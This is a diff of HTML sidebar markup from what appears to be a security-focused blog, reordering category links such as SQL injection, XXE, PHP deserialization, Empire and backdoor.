         <span class="sidebar-category-name" data-categories="学习笔记"><span class="iconfont-archer">&#xe60a;</span>学习笔记</span>
     
         <span class="sidebar-category-name" data-categories="Arbitrary-File-Upload"><span class="iconfont-archer">&#xe60a;</span>Arbitrary-File-Upload</span>
     
-        <span class="sidebar-category-name" data-categories="Linux"><span class="iconfont-archer">&#xe60a;</span>Linux</span>
-    
         <span class="sidebar-category-name" data-categories="CVE-Request"><span class="iconfont-archer">&#xe60a;</span>CVE-Request</span>
     
-        <span class="sidebar-category-name" data-categories="sql注入"><span class="iconfont-archer">&#xe60a;</span>sql注入</span>
-    
-        <span class="sidebar-category-name" data-categories="http协议"><span class="iconfont-archer">&#xe60a;</span>http协议</span>
-    
-        <span class="sidebar-category-name" data-categories="Empire"><span class="iconfont-archer">&#xe60a;</span>Empire</span>
-    
-        <span class="sidebar-category-name" data-categories="git"><span class="iconfont-archer">&#xe60a;</span>git</span>
+        <span class="sidebar-category-name" data-categories="write-up"><span class="iconfont-archer">&#xe60a;</span>write-up</span>
     
         <span class="sidebar-category-name" data-categories="漏洞分析"><span class="iconfont-archer">&#xe60a;</span>漏洞分析</span>
     
-        <span class="sidebar-category-name" data-categories="php反序列化"><span class="iconfont-archer">&#xe60a;</span>php反序列化</span>
+        <span class="sidebar-category-name" data-categories="Empire"><span class="iconfont-archer">&#xe60a;</span>Empire</span>
+    
+        <span class="sidebar-category-name" data-categories="http协议"><span class="iconfont-archer">&#xe60a;</span>http协议</span>
+    
+        <span class="sidebar-category-name" data-categories="sql注入"><span class="iconfont-archer">&#xe60a;</span>sql注入</span>
+    
+        <span class="sidebar-category-name" data-categories="git"><span class="iconfont-archer">&#xe60a;</span>git</span>
     
         <span class="sidebar-category-name" data-categories="python"><span class="iconfont-archer">&#xe60a;</span>python</span>
     
         <span class="sidebar-category-name" data-categories="scrapy"><span class="iconfont-archer">&#xe60a;</span>scrapy</span>
     
-        <span class="sidebar-category-name" data-categories="xxe"><span class="iconfont-archer">&#xe60a;</span>xxe</span>
+        <span class="sidebar-category-name" data-categories="php反序列化"><span class="iconfont-archer">&#xe60a;</span>php反序列化</span>
+    
+        <span class="sidebar-category-name" data-categories="代码执行"><span class="iconfont-archer">&#xe60a;</span>代码执行</span>
     
         <span class="sidebar-category-name" data-categories="内网"><span class="iconfont-archer">&#xe60a;</span>内网</span>
     
-        <span class="sidebar-category-name" data-categories="代码执行"><span class="iconfont-archer">&#xe60a;</span>代码执行</span>
+        <span class="sidebar-category-name" data-categories="xxe"><span class="iconfont-archer">&#xe60a;</span>xxe</span>
     
         <span class="sidebar-category-name" data-categories="后门"><span class="iconfont-archer">&#xe60a;</span>后门</span>
     
